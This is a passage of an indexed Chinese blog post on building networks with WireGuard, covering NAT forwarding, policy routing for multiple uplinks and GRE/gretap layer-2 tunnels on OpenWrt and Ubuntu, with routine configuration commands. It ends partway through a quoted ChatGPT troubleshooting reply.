\u8fd9\u79cd\u5bf9\u4e8e\u6811\u8393\u6d3e\u8fd9\u79cd\u8fd8\u597d\uff0c\u5982\u679c\u662f\u624b\u673a\u53ef\u80fd\u5c31\u4e0d\u884c\u4e86\u3002</p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#ospf","title":"OSPF\uff1f","text":"<p>\u4e0a\u97623\u4e2a\u5b50\u7f51\u901a\u8fc7wg\u7ec4\u7f51\u65f6\uff0c\u9700\u8981\u624b\u52a8\u8bbe\u7f6e\u8def\u7531\u8868\u3002\u6709\u6ca1\u6709\u4e00\u79cd\u65b9\u5f0f\uff0c\u5f7b\u5e95\u8ba9\u8def\u7531\u5668\u81ea\u52a8\u914d\u7f6e\u5462\uff1f</p> <p>\u8fd9\u5176\u5b9e\u5c31\u662f\u8def\u7531\u534f\u8bae\u7684\u4f5c\u7528\uff0c\u907f\u514d\u624b\u52a8\u8bbe\u7f6e\u8def\u7531\uff0c\u800c\u662f\u8ba9\u8def\u7531\u5668\u81ea\u52a8\u5b66\u4e60\u8def\u7531\u8868\u3002\u5e38\u89c1\u7684\u8def\u7531\u534f\u8bae\u6709\uff1aRIP\uff0cOSPF\u3002\u4f46\u662fOSPF\u80fd\u5426\u8fd0\u884c\u5728wg\u6784\u6210\u7684\u865a\u62df\u94fe\u8def\u4e0a\u5462\uff1f</p> <p>\u8def\u7531\u534f\u5b9a\uff08\u82f1\u8bed\uff1aRouting protocol\uff09\u662f\u4e00\u79cd\u6307\u5b9a\u5c01\u5305\u8f6c\u9001\u65b9\u5f0f\u7684\u7f51\u8def\u534f\u5b9a\u3002Internet\u7f51\u7edc\u7684\u4e3b\u8981\u8282\u70b9\u8bbe\u5907\u662f\u8def\u7531\u5668\uff0c\u8def\u7531\u5668\u901a\u8fc7\u8def\u7531\u8868\u6765\u8f6c\u53d1\u63a5\u6536\u5230\u7684\u6570\u636e\u3002\u8f6c\u53d1\u7b56\u7565\u53ef\u4ee5\u662f\u4eba\u5de5\u6307\u5b9a\u7684\uff08\u901a\u8fc7\u9759\u6001\u8def\u7531\u3001\u7b56\u7565\u8def\u7531\u7b49\u65b9\u6cd5\uff09\u3002\u5728\u5177\u6709\u8f83\u5c0f\u89c4\u6a21\u7684\u7f51\u7edc\u4e2d\uff0c\u4eba\u5de5\u6307\u5b9a\u8f6c\u53d1\u7b56\u7565\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\u3002\u4f46\u662f\u5728\u5177\u6709\u8f83\u5927\u89c4\u6a21\u7684\u7f51\u7edc\u4e2d\uff08\u5982\u8de8\u56fd\u4f01\u4e1a\u7f51\u7edc\u3001ISP\u7f51\u7edc\uff09\uff0c\u5982\u679c\u901a\u8fc7\u4eba\u5de5\u6307\u5b9a\u8f6c\u53d1\u7b56\u7565\uff0c\u5c06\u4f1a\u7ed9\u7f51\u7edc\u7ba1\u7406\u5458\u5e26\u6765\u5de8\u5927\u7684\u5de5\u4f5c\u91cf\uff0c\u5e76\u4e14\u5728\u7ba1\u7406\u3001\u7ef4\u62a4\u8def\u7531\u8868\u4e0a\u4e5f\u53d8\u5f97\u5341\u5206\u56f0\u96be\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u52a8\u6001\u8def\u7531\u534f\u8bae\u5e94\u8fd0\u800c\u751f\u3002\u52a8\u6001\u8def\u7531\u534f\u8bae\u53ef\u4ee5\u8ba9\u8def\u7531\u5668\u81ea\u52a8\u5b66\u4e60\u5230\u5176\u4ed6\u8def\u7531\u5668\u7684\u7f51\u7edc\uff0c\u5e76\u4e14\u7f51\u7edc\u62d3\u6251\u53d1\u751f\u6539\u53d8\u540e\u81ea\u52a8\u66f4\u65b0\u8def\u7531\u8868\u3002\u7f51\u7edc\u7ba1\u7406\u5458\u53ea\u9700\u8981\u914d\u7f6e\u52a8\u6001\u8def\u7531\u534f\u8bae\u5373\u53ef\uff0c\u76f8\u6bd4\u4eba\u5de5\u6307\u5b9a\u8f6c\u53d1\u7b56\u7565\uff0c\u5de5\u4f5c\u91cf\u5927\u5927\u51cf\u5c11\u3002</p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#wg\u4f7f\u7528\u573a\u666f","title":"wg\u4f7f\u7528\u573a\u666f","text":"<p>\u6309\u7167\u7528\u9014\uff0c\u5217\u4e3e\u51e0\u79cd\u4f7f\u7528\u573a\u666f</p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u5185\u7f51\u7a7f\u900f","title":"\u5185\u7f51\u7a7f\u900f","text":"<p>\u5373\u9700\u8981\u4ece\u5916\u7f51\u8bbf\u95eeNAT\u540e\u8bbe\u5907\u3002</p> <p>\u53ef\u4ee5\u5728\u8def\u7531\u5668\uff08\u6709\u516c\u7f51\u5730\u5740\uff09\u4e0a\u88c5wg\uff0c\u8bbe\u7f6e\u5141\u8bb8wg\u8f6c\u53d1\u5230wan\u548clan\u3002\u5176\u5b83\u8bbe\u5907\uff08\u5982\u624b\u673a\uff09\u901a\u8fc7wg\u8fde\u63a5\u5230\u8def\u7531\u5668\uff0c\u4ece\u800c\u53ef\u4ee5\u8bbf\u95ee\u8def\u7531\u5668\u4e0b\u5c40\u57df\u7f51\u548c\u901a\u8fc7\u8def\u7531\u5668\u4e0a\u7f51\u3002</p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u7f51\u7edc\u8f6c\u53d1","title":"\u7f51\u7edc\u8f6c\u53d1","text":"","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u4e00\u7ea7\u7f51\u7edc\u8f6c\u53d1","title":"\u4e00\u7ea7\u7f51\u7edc\u8f6c\u53d1","text":"<p>\u4e00\u53f0\u8bbe\u5907\u901a\u8fc7\u53e6\u4e00\u53f0\u8bbe\u5907\u4e0a\u7f51\u3002</p> <p>\u5982\u5b9e\u9a8c\u5ba4A\u670d\u52a1\u5668\u65e0\u6cd5\u4e0a\u7f51\uff0cB\u670d\u52a1\u5668\u53ef\u4ee5\u4e0a\u7f51\uff08\u6bd4\u5982\u767b\u5f55\u4e86\u7f51\u7edc\u901a\u8d26\u53f7\uff09\uff0cA\u53ef\u4ee5\u8bbf\u95eeB\u3002\u53ef\u4ee5\u901a\u8fc7wg\u5728A, B\u95f4\u5efa\u7acb\u96a7\u9053\uff0c\u8bbe\u7f6eA\u7684\u9ed8\u8ba4\u8def\u7531\u5668\u4e3awg\uff0c\u4ece\u800c\u5c06A\u7684\u6d41\u91cf\u90fd\u8f6c\u53d1\u7ed9B\u3002B\u4e0a\u518d\u5f00\u542fipv4\u8def\u7531\u8f6c\u53d1\uff0cA\u4fbf\u53ef\u4ee5\u4e0a\u7f51\u3002</p> <p>p.s \u8fd9\u91ccA\u548cB\u867d\u540c\u5c5e\u4e8e\u5b66\u6821\u5185\u7f51\uff0c\u4f46\u4ecd\u7136\u4e0d\u662f\u540c\u4e00\u4e2a\u7f51\u6bb5\u3002\u5982\u679cA\u548cB\u4f4d\u4e8e\u540c\u4e00\u4e2a\u5c40\u57df\u7f51\uff0c\u5219\u4e0d\u9700\u8981\u4f7f\u7528wg\uff0c\u800c\u662f\u5c06A\u7684\u7f51\u5173\u8bbe\u7f6e\u4e3aB\uff0c\u7136\u540e\u5728B\u4e2d\u8bbe\u7f6e\u5c06A\u7684\u6d41\u91cfNAT\u5373\u53ef\u3002</p> <p>\u5e95\u5c42\u8fc7\u7a0b\u5176\u5b9e\u548c\u4e0a\u9762\u5185\u7f51\u7a7f\u900f\u662f\u4e00\u6837\u7684\uff0c\u4e0d\u8fc7\u6709\u4e2a\u4e0d\u540c\u7684\u5730\u65b9\uff1a</p> <ul> <li>\u539f\u8def\u8fd4\u56de\u95ee\u9898\uff1a\u6211\u4eec(\u5047\u8bbe\u4e3aC)\u4ecd\u9700\u8981\u901a\u8fc7\u4e00\u4e2aip\u53bb\u76f4\u63a5\u8bbf\u95eeA\uff0c\u8bf7\u6c42ip\u5305\u4e3a(src=C, dst=A)\u3002\u7167\u7406\u6765\u8bf4\u54cd\u5e94\u5305\u7684\u6e90\u5730\u5740\u5e94\u8be5\u662fA\uff0c\u4f46\u662f\u914d\u7f6ewg\u540e\uff0cA\u7684\u9ed8\u8ba4\u8def\u7531\u662fwg\uff0c\u56e0\u6b64\u6309\u7167\u8def\u7531\u89c4\u5219\uff0c\u54cd\u5e94\u5305\u4f1a\u53d8\u4e3a(src=wg, dst=C)\uff0c\u5e76\u53d1\u9001\u7ed9B\u3002B\u65e0\u6cd5\u5c06\u79c1\u6709\u5730\u5740\u7684\u5305\u53d1\u9001\u5230\u516c\u7f51\u4e0a\u53bb\uff0c\u56e0\u6b64C\u65e0\u6cd5\u6536\u5230\u54cd\u5e94\u3002</li> <li>\u89e3\u51b3\u529e\u6cd5\uff1a\u4f7f\u7528\u7b56\u7565\u8def\u7531\uff0c\u5728\u5e94\u7528wg\u7684default\u8def\u7531\u524d\uff0c\u63d0\u524d\u5c06\u6e90\u5730\u5740\u4e3aA\u7684\u6309\u7167\u5bf9\u5e94\u63a5\u53e3\u53d1\u9001\u51fa\u53bb</li> </ul>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u4e8c\u7ea7\u7f51\u7edc\u8f6c\u53d1","title":"\u4e8c\u7ea7\u7f51\u7edc\u8f6c\u53d1","text":"<p>\u540c\u4e0a\uff0c\u4f46\u662fB\u670d\u52a1\u5668\u4e5f\u662f\u901a\u8fc7wg\u8f6c\u53d1\u7ed9\u53e6\u4e00\u53f0\u670d\u52a1\u5668C\u7684\u3002\u6b64\u65f6\u4f1a\u9047\u5230\u65b0\u7684\u95ee\u9898\uff1a</p> <ul> <li>\u5728\u6309\u7167\u4e0a\u8ff0\u914d\u7f6e\u5b8cA\u540e\uff0c\u4f1a\u53d1\u73b0A\u4ecd\u7136\u65e0\u6cd5\u4e0a\u7f51\u3002\u8fc7\u7a0b\u5982\u4e0b\uff1a</li> <li>A\u8bf7\u6c42\u7684\u5305(src=wgA, dst=B\u7ad9)</li> <li>B\u63a5\u6536\u540e\uff0c\u8f6c\u53d1\u7ed9C(src=wgA, dst=B\u7ad9)</li> <li>C\u63a5\u6536\u540e\uff0c\u8fdb\u884cSNAT(src=C_WAN, dst=B\u7ad9)\uff0c\u8bb0\u5f55ip\u7aef\u53e3\u6620\u5c04\u5173\u7cfb</li> <li>B\u7ad9\u54cd\u5e94(src=B\u7ad9, dst=C_WAN)</li> <li>C\u63a5\u6536\u540e\uff0c\u8fdb\u884cDNAT(src=B\u7ad9, dst=wgA)</li> <li>\u6b64\u65f6\u53ef\u4ee5\u53d1\u73b0\uff0cdst=wgA\uff0cC\u662f\u65e0\u6cd5\u8def\u7531\u7ed9A\u7684</li> </ul> <p>\u89e3\u51b3\u65b9\u6cd5\uff1a</p> <ul> <li>B\u4e0a\u4e3awg\u63a5\u53e3\u8bbe\u7f6eNAT\u3002\u8fc7\u7a0b\u5982\u4e0b\uff1a</li> <li>A\u8bf7\u6c42\u7684\u5305(src=wgA, dst=B\u7ad9)</li> <li>B\u63a5\u6536\u540e\uff0c\u8fdb\u884cSNAT(src=wgB, dst=B\u7ad9)\uff0c\u8f6c\u53d1\u7ed9C</li> <li>C\u63a5\u6536\u540e\uff0c\u8fdb\u884cSNAT(src=C_WAN, dst=B\u7ad9)\uff0c\u8bb0\u5f55ip\u7aef\u53e3\u6620\u5c04\u5173\u7cfb</li> <li>B\u7ad9\u54cd\u5e94(src=B\u7ad9, dst=C_WAN)</li> <li>C\u63a5\u6536\u540e\uff0c\u8fdb\u884cDNAT(src=B\u7ad9, dst=wgB)\uff0c\u8f6c\u53d1\u7ed9B</li> <li>B\u63a5\u6536\u540e\uff0c\u8fdb\u884cDNAT(src=B\u7ad9, dst=wgA)\uff0c\u8f6c\u53d1\u7ed9A</li> <li>A\u63a5\u6536\u5230\u54cd\u5e94</li> </ul> <p>\u4e0a\u9762\u4e8c\u7ea7\u7f51\u7edc\u8f6c\u53d1\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\uff0c\u4e3a\u4ecewg\u51fa\u53bb\u7684\u6d41\u91cf\u8bbe\u7f6eNAT\u3002 <pre><code> iptables -t nat -A POSTROUTING -s 10.0.0.2 -o wg0 -j MASQUERADE\n</code></pre></p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u8fde\u63a5\u5b50\u7f51","title":"\u8fde\u63a5\u5b50\u7f51","text":"<p>\u8fde\u63a5\u4e24\u53f0\u8def\u7531\u5668\u5bf9\u5e94\u7684\u5b50\u7f51\uff0c\u8fde\u63a5\u4efb\u4e00\u53f0\u8def\u7531\u5668\u5747\u53ef\u8bbf\u95ee\u4e24\u4e2a\u5b50\u7f51\u7684\u8bbe\u5907\u3002</p> <p>\u5373\u6211\u7684\u7f51\u7edc\u7ed3\u6784</p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u539f\u8def\u8fd4\u56de\u95ee\u9898\u591a\u7f51\u5173\u8bbe\u7f6e","title":"\u539f\u8def\u8fd4\u56de\u95ee\u9898/\u591a\u7f51\u5173\u8bbe\u7f6e","text":"<p>\u5728\u5ba2\u6237\u7aef\u914d\u7f6ewireguard allowip\u4e3a0.0.0.0/0\u540e\uff0c\u4f1a\u51fa\u73b0\u65e0\u6cd5\u8bbf\u95ee\u5ba2\u6237\u7aef\u81ea\u8eab\u7684\u60c5\u51b5\uff08ping, ssh\uff09\u3002</p> <p>\u8fd9\u662f\u56e0\u4e3a\uff1a</p> <p>linux \u9ed8\u8ba4\u6ca1\u6709\u201c\u6d41\u91cf\u539f\u8def\u8fd4\u56de\u201d\u7684\u529f\u80fd</p> <p>\u8003\u8651\u6709\u4e24\u4e2aISP\u7684\u7f51\u7edc\uff08\u591a\u51fa\u53e3\uff09\uff0c\u5982\u4f55\u505a\u5230\u6570\u636e\u539f\u8def\u8fd4\u56de\u5462</p> <p>\u53c2\u8003\uff1aRouting for multiple uplinks/providers (lartc.org)</p> <p></p> <ol> <li> <p>\u9996\u5148\uff0c\u5728main\u8def\u7531\u8868\u4e2d\u6dfb\u52a0\u5230\u4e24\u4e2aISP\u7f51\u6bb5\u7684\u8def\u7531\uff0c\u8fd9\u4fdd\u8bc1\u53ef\u4ee5\u8bbf\u95ee\u5230\u4e24\u4e2aISP\u7684\u7f51\u5173</p> </li> <li> <p>\u63a5\u7740\uff0c\u6dfb\u52a0\u9ed8\u8ba4\u8def\u7531\u3002</p> </li> <li> <p>\u53ef\u4ee5\u4e4b\u540e\u518d\u6dfb\u52a0\u7b56\u7565\u8def\u7531\uff0c\u4f7f\u5f97\u67d0\u4e9bip\u8d70IPS1\uff0c\u5269\u4f59\u8d70IPS2</p> </li> <li> <p>\uff08\u63a5\u4e0b\u6765\u4e24\u6b65\u7528\u4e8e\u4fdd\u8bc1\u6570\u636e\u80fd\u591f\u539f\u8def\u8fd4\u56de\uff0c\u4e0d\u4f1a\u51fa\u73b0\u6765\u81eaIPS1\u7684\u6d41\u91cf\uff0c\u4eceIPS2\u51fa\u53bb\uff09</p> </li> <li> <p>\u7136\u540e\uff0c\u521b\u5efa\u4e24\u4e2a\u65b0\u7684\u8def\u7531\u8868T1\u548cT2\uff0c\u5404\u81ea\u5c06\u5bf9\u5e94\u7684ISP\u8bbe\u7f6e\u4e3a\u9ed8\u8ba4\u8def\u7531</p> </li> <li> <p>\u6700\u540e\uff0c\u6dfb\u52a0\u8def\u7531\u7b56\u7565\u3002\u8be5\u89c4\u5219\u6839\u636e\u5305\u7684\u6e90\u5730\u5740\u9009\u62e9\u4f7f\u7528\u5bf9\u5e94ISP\u7684\u8def\u7531\u8868\uff08T1, T2\uff09\u3002</p> </li> <li>\u8fd9\u91cc\uff0c\u91cd\u70b9\u5728\u4e8e\u9700\u8981\u539f\u8def\u8fd4\u56de\u7684\u5305\uff0c\u5df2\u7ecf\u83b7\u5f97src\u5730\u5740\u4e86\uff1f\u4e0d\u9700\u8981\u539f\u8def\u8fd4\u56de\u7684\u5305\uff0c\u5219\u6839\u636e\u4e4b\u524d\u7684\u7b56\u7565\u9009\u62e9ISP\u51fa\u53e3\u540e\uff0c\u8bbe\u7f6esrc\u5730\u5740\u3002</li> </ol> <pre><code>ip route add 211.200.0.0/30 dev eth1 src 221.200.0.2 table main\nip route add 58.56.0.0/30 dev eth2 src 58.56.0.2 table main\n\nip route add default via 221.200.0.1\n\nip route add 211.200.0.0/30 dev eth1 src 221.200.0.2 table T1\nip route add default via 221.200.0.1 table T1\nip route add 58.56.0.0/30 dev eth2 src 58.56.0.2 table T2\nip route add default via 58.56.0.1 table T2\n\nip rule add from 221.200.0.2 table T1\nip rule add from 58.56.0.2 table T2\n</code></pre>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#wiregaurd--l2\u96a7\u9053\u7ec4\u7f51","title":"Wiregaurd + L2\u96a7\u9053\u7ec4\u7f51","text":"","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#l2\u96a7\u9053\u4f18\u70b9-vs-\u7f3a\u70b9","title":"L2\u96a7\u9053\u4f18\u70b9 vs \u7f3a\u70b9","text":"<p>I really like wireguard, but one thing that bugs me is the fact that it's layer ... | Hacker News (ycombinator.com)</p> <p>In most scenarios, you want to avoid L2 tunnels to reduce complexity and/or performance issues. The chain of thought typically goes like this:</p> <ul> <li>Remote networks are connected via L2 tunnel.</li> <li>ARP requests are broadcasted over L2 tunnel to all connected networks, introducing scalability issues</li> <li>Proxy ARP is introduced to cache ARP responses</li> <li>Proxy ARP may become out of date or not scale as the L2 domain grows.</li> <li>BGP is introduced to keep track of and broadcast all topology changes</li> <li>How do you mitigate issues caused if Proxy ARP fails?</li> </ul> <p>Most of these issues go away if you use IP tunnels instead of Ethernet because IP was designed to be routable.</p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u5404\u79cd\u96a7\u9053\u5bf9\u6bd4","title":"\u5404\u79cd\u96a7\u9053\u5bf9\u6bd4","text":"<p>\u5404\u79cd\u96a7\u9053\u5bf9\u6bd4\uff1aAn introduction to Linux virtual interfaces: Tunnels | Red Hat Developer - ipip - gre, gretap</p> <p>GRE tunnels </p> <p>GRETAP </p> <p>\u4e00\u79cd\u534f\u540c\u4f7f\u7528\u591a\u79cd\u96a7\u9053\u4f8b\u5b50 - udp2raw\uff1awg\u57fa\u4e8eudp\uff0c\u53ef\u80fd\u88ab\u8fd0\u8425\u5546qos\u3002\u4f7f\u7528udp2raw \u5b9e\u73b0udp in tcp - wg\uff1aL3\u96a7\u9053 - gre: \u56fe\u4e2d\u7684\u662ftun\uff0c\u4ecd\u662f\u4e09\u5c42\u96a7\u9053 wireguard, wireguard layer 2, wireguard over TCP (github.com)</p> <pre><code> Host on private LAN                                         Host on the Internet\n +---------------------------------+                       +-------------------------------+\n |   brtun bridge                  |                       |                  brtun bridge |\n | +-------------+                 |                       |                 +--------+    |\n | | ethX gretun |&lt;-&gt;wg0&lt;-&gt;udp2raw | &lt;-Internet, TCP 443-&gt; | udp2raw&lt;-&gt;wg0&lt;-&gt;| gretun |    |\n | +-------------+                 |                       |                 +--------+    |\n +---------------------------------+                       +-------------------------------+\n\n brtun: 192.168.0.200/24                                    brtun: 192.168.0.50/24\n wg0: 12.12.12.2/24                                         wg0: 12.12.12.1/24\n gretun: 12.12.12.2-&gt;12.12.12.1                             gretun: 12.12.12.1-&gt;12.12.12.2\n</code></pre>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#openwrt-gre\u914d\u7f6e","title":"openwrt gre\u914d\u7f6e","text":"<p>[OpenWrt Wiki] Tunneling interface protocols [OpenWrt Wiki] Routing example: GRE</p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u80cc\u666f\uff1a\u5b66\u6821\u5bbf\u820d\u697c\u6ca1\u6709\u5206\u914dPD\uff0c\u800c\u5b9e\u9a8c\u697c\u5206\u914d\u4e86/64\u7684PD\u3002\u56e0\u6b64\u60f3\u901a\u8fc7L2\u96a7\u9053\uff0c\u5c06\u5bbf\u820d\u697c\u7684\u63a5\u53e3\u6865\u63a5\u5230\u5b9e\u9a8c\u697c\u8def\u7531\u5668\u7684wan\u53e3\u4e0a\uff0c\u4ece\u800c\u83b7\u5f97\u4e00\u4e2aPD\u5730\u5740\u3002\u4e4b\u540e\u5229\u7528\u8be5PD\u5728lan\u4e0a\u5f00\u542fipv6 ra server\uff0c\u7ed9lan\u5206\u914dipv6\u5730\u5740\u3002</p> <p>\u601d\u8def\uff1a\u4e24\u53f0\u8def\u7531\u5668op1, op2\u901a\u8fc7wg\u8fde\u63a5\uff0c\u57fa\u4e8ewg\u63a5\u53e3ip\u5efa\u7acbgretap\u96a7\u9053\u3002op1\u5c06\u8be5tap\u6865\u63a5\u5230br-wan\u4e0a\u3002op2\u5728\u8be5tap\u4e0a\u5f00\u542fdhcpv6 client\uff0c\u7533\u8bf7\u4e00\u4e2aPD\u3002</p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<pre><code>root@op1 \u279c  ~ opkg list-installed |grep gre\ngre - 13\nkmod-gre - 5.10.146-1\nkmod-gre6 - 5.10.146-1\nluci-proto-gre - git-21.158.43143-b4c394f\n</code></pre> <p>\u5b89\u88c5\u4e86gre\u540e\uff0cluci\u4e2d\u521b\u5efa\u63a5\u53e3\u65f6\u53ef\u80fd\u8fd8\u662f\u65e0\u6cd5\u9009\u62e9gre\uff0c\u6b64\u65f6\u53ef\u4ee5\uff1a - \u5c1d\u8bd5\u91cd\u542fnetwork: /etc/init.d/network restart - \u68c0\u67e5\u662f\u5426\u52a0\u8f7d\u4e86gre\u6a21\u5757\uff0c\u6ca1\u6709\u7684\u8bdd\uff0c\u53ef\u4ee5ip link add type gretap\u624b\u52a8\u521b\u5efa\u63a5\u53e3\uff0c\u8fd9\u6837\u5c31\u4f1a\u81ea\u52a8\u52a0\u8f7d\u5185\u6838\u6a21\u5757\u4e86 <pre><code>root@op1 \u279c  ~ lsmod |grep gre\ngre                    16384  1 ip_gre\nip_gre                 36864  0\nip_tunnel              32768  1 ip_gre\n</code></pre></p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u914d\u7f6e","title":"\u914d\u7f6e","text":"<p>op1\u548cop2\u4e0a\u90fd\u521b\u5efagre1\u63a5\u53e3 - protocal\u9009\u62e9gretap over ipv4 - local\u548cremote\u5730\u5740\u586bwg\u63a5\u53e3\u5730\u5740 - \u521b\u5efa\u6210\u529f\u540e\uff0cip a\u53ef\u4ee5\u770b\u5230\u591a\u51fa\u4e00\u4e2agre4t-gre1\u7684\u63a5\u53e3 </p> <p>op1\u5c06gre device\u6dfb\u52a0\u5230bridge - \u540d\u5b57\u586b@gre1\uff08\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5199gre4t-gre1\uff09 </p> <p>op1\u8bbe\u7f6e\u9632\u706b\u5899 - \u5c06gre1\u8bbe\u7f6e\u4e3awan - \u9632\u706b\u5899\u4e2d\uff0c\u8bbe\u7f6ewan zone forward\u4e3aaccept\uff08\u9ed8\u8ba4\u4e3areject\uff09\u3002\u5426\u5219gre1\u8bbe\u5907\u4e0a\u7684\u5305\u65e0\u6cd5\u8f6c\u53d1\u7ed9wan\u4e0b\u9762\u7684\u5176\u4ed6\u8bbe\u5907 </p> <p></p> <p>op2\u8bbe\u7f6edhcpv6 \u5728gre1 tap\u4e0a\u542f\u7528dhcpv6 client\uff0copenwrt\u4e0a\u8be5\u64cd\u4f5c\u4e3a\u521b\u5efa\u4e00\u4e2ainterface\uff0c\u534f\u8bae\u9009\u62e9dhcpv6 client - \u8be5\u63a5\u53e3\u9ad8\u7ea7\u8bbe\u7f6e\u4e2d\u53ef\u4ee5\u52fe\u9009source route\uff0c\u8fd9\u6837\u5bf9\u4e8e\u6709\u591a\u4e2auplink\uff0c\u5c31\u80fd\u81ea\u52a8\u5904\u7406\u8def\u7531     - \u6e90\u5730\u5740\u4e3a\u8be5pd\u7684\u5730\u5740\uff0c\u8d70tap\u63a5\u53e3     - \u6e90\u5730\u5740\u4e3awan\u53e3slaac\u7684\u5730\u5740\uff0c\u8d70\u539f\u6765\u7684wan\u53e3 </p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#ubuntu-gre\u914d\u7f6e","title":"ubuntu gre\u914d\u7f6e","text":"<ul> <li>\u5148\u4f7f\u7528wg0\uff0c\u5efa\u7acbwiregaurd\u8fde\u63a5</li> <li>\u518d\u4f7f\u7528gretap\u5efa\u7acb\u4e8c\u5c42\u96a7\u9053</li> <li>\u63a5\u7740op\u7aef\u5728gretap device\u4e0a\u521b\u5efadhcp6\u7684client\uff08\u7531\u4e8e\u53ea\u9700\u8981ipv6 PD\uff0c\u56e0\u6b64\u53ef\u4ee5\u4e0d\u8bbe\u7f6edhcpv4\uff09</li> <li>ubuntu\u7aef\u5c06gretap\u548cbr0(ustcnet bridge)\u6865\u63a5</li> <li>\u6b64\u65f6op\u5df2\u7ecf\u53ef\u4ee5\u83b7\u5f97ipv6 PD\u4e86</li> <li>lan interface\u4e0a\u52fe\u7ebfipv6 prefix\uff0c\u5f00\u542fra server\u3002\u4e4b\u540elan\u5185\u8bbe\u5907\u5c31\u53ef\u4ee5\u83b7\u5f97ipv6\u5730\u5740\u4e86</li> <li>\u6b64\u65f6lan\u5185\u8bbe\u5907ipv6\u4ecd\u65e0\u6cd5\u4e0a\u7f51\uff0c\u9700\u8981\u5728ubuntu\u4e0a\u5f00\u542fipv6 forward</li> </ul> <pre><code>sudo systemctl start wg-quick@op2-gre-wg0\nsudo ip link add op2-gre1 type gretap  local 10.0.31.10 remote 10.0.31.2 ttl 255\nsudo ip link set op2-gre1 up\nsudo ip link set op2-gre1 master br0\n</code></pre>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#gre\u4e0d\u901achatgpt\u56de\u590d","title":"gre\u4e0d\u901a\uff0cchatgpt\u56de\u590d","text":"<p>\u6211\u521b\u5efa\u4e86\u4e00\u4e2apve lxc\u5bb9\u5668\uff0c\u5206\u914d\u7684\u7f51\u7edc\u63a5\u53e3eth0\u5bf9\u5e94pve\u7684vmbr0\uff0c\u5bb9\u5668\u5185eth0\u63a5\u5728br-wan\u4e0a\u3002\u7136\u540e\u6211\u5728pve lxc\u5bb9\u5668\u4e2d\u521b\u5efa\u4e86\u4e00\u4e2agretap\u8bbe\u5907\uff0c\u6865\u63a5\u5230br-wan\u4e0a\uff0c\u4f46\u662fgretap\u4e0a\u7684ipv6 rs\u62a5\u6587\u65e0\u6cd5\u901a\u8fc7br-wan\u53d1\u9001\u5230eth0\uff0c\u4ece\u800c\u65e0\u6cd5\u6b63\u786e\u53d1\u9001\u5230pve\u5916\u7684vmbr0\uff0c\u6211\u8be5\u600e\u4e48\u505a</p> <p>ChatGPT</p> <p>\u60a8\u7684\u7f51\u7edc\u62d3\u6251\u4e2d\u5305\u542b\u4e86\u591a\u5c42\u865a\u62df\u5316\u7f51\u7edc\uff08PVE\u5bb9\u5668\u5185\u7684GRETAP\u8bbe\u5907\u3001LXC\u5bb9\u5668\u548cPVE\u5bbf\u4e3b\u673a\uff09\u3002\u4e3a\u4e86\u786e\u4fddGRETAP\u8bbe\u5907\u7684IPv6 RS\u62a5\u6587\u80fd\u591f\u6b63\u786e\u4f20\u9012\u5230PVE\u5bbf\u4e3b\u673a\u7684vmbr0\u4ee5\u5916\u7684\u7f51\u7edc\uff0c\u60a8\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u7f51\u7edc\u914d\u7f6e\u3002\u4ee5\u4e0b\u662f\u53ef\u80fd\u7684\u89e3\u51b3\u65b9\u6cd5\uff1a 1. \u68c0\u67e5IPv6 